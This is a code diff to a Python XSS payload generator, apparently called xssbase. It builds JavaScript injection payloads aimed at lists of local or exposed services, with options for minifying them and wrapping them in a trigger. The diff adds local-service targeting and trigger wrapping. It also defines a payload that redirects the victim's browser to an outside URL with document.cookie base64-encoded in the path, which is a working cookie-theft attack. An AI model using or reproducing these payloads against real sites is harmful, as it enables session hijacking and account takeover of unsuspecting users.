@@ -1,10 +1,5 @@
 import xssbase.lib.var as var
 import xssbase.lib.logger as log
-import pprint
-import json 
-
-pp = pprint.PrettyPrinter(indent=4)
-
 
 def router(args):
 	args=args.split()
@@ -14,6 +9,7 @@ def router(args):
 	payloads=[]
 	payload=""
 	payloadFind=False
+	triggerExists=False
 
 	if("minified" in args or "mini" in args):
 		minified=True
@@ -24,6 +20,9 @@ def router(args):
 	if("exposed" in args):
 		exposed=True
 
+	if("trigger" in args):
+		triggerExists=True
+
 	for arg in args: 
 		if(arg.upper() in PAYLOAD):
 			payloadFind=True
@@ -33,16 +32,11 @@ def router(args):
 		payloadAvailable=PAYLOAD.keys()
 		print(', '.join([k.lower() for k in PAYLOAD.keys()]))
 
-	#Define payload
-	# if('firebase' in args):
-	# 	payload=PAYLOAD_FIREBASE
-
 	if(local):
-		pass
-		#process only for local 
+		for url in var.var_localServices:
+			payloads.append(payload.replace("TO_REPLACE",url))
 	elif(exposed):
 		for url in var.var_exposedServices:
-			log.payload(url)
 			payloads.append(payload.replace("TO_REPLACE",url))
 	else:
 		url=""
@@ -50,9 +44,16 @@ def router(args):
 
 	for payload in payloads:
 		if(minified):
-			log.payload(minify(payload))
+			if(triggerExists):
+				log.payload(var.var_trigger % minify(payload))
+			else:
+				log.payload(minify(payload))
 		else:
-			log.payload(payload)	
+			if(triggerExists):
+				log.payload(var.var_trigger % payload)
+			else:
+				log.payload(payload)
+
 	return 
 
 def minify(payload):
@@ -99,10 +100,6 @@ PAYLOAD['FIREBASE'] = """
 	});
 """
 
-PAYLOAD['GENERIC']="""
-<script>window.location.href='TO_REPLACE'</script>
-"""
+PAYLOAD['GENERIC']="""window.location.href='TO_REPLACE'"""
+PAYLOAD['GENERIC_COOKIES_GET']="""window.location.href='TO_REPLACE'+'/'+btoa(document.cookie)"""
 
-PAYLOAD['GENERIC_COOKIES_GET']="""
-<script>window.location.href='TO_REPLACE'+'/'+btoa(document.cookie)</script>
-"""
